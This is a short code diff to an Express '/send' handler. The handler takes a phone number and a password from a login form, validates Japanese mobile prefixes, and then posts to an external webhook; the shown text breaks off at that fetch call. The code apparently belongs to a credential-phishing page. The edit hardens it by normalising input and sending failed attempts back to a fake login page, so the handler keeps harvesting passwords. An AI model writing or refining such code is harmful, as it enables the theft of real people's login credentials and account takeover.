@@ -11,10 +11,14 @@ app.post("/send", async (req, res) => {
   const phone = req.body.name;
   const password = req.body.message;
 
-  if (!/^(090|080|070|060)/.test(phone) || !/[A-Z]/.test(password)) {
-    return res.status(400).send("パスワードまたは電話番号が間違えています。");
-  }
+    // 安全対策（空のときに落ちないようにする）
+  const safePhone = typeof phone === 'string' ? phone : '';
+  const safePassword = typeof password === 'string' ? password : '';
+  const cleanPhone = safePhone.replace(/[- ]/g, '');
 
+  if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
+    return res.redirect("/login.html?error=1");
+  }
 
   try {
     await fetch(webhook, {
